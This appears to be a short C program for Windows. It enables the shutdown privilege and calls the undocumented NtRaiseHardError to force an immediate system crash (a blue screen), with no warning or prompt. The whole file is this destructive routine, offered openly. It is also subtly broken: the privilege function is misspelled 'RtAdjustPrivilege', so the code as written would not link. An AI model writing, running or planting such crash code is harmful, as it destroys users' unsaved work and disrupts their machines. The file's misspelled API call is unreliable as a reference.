/* Calling the Windows API */
#include <Windows.h>

/* On some compilers, main is defined as SDL_main (see https://stackoverflow.com/a/30189915) */
#undef main

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);


int main()
{
    BOOLEAN bl;
    unsigned long response;
    RtAdjustPrivilege(19, true, false, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
    return 0;
}
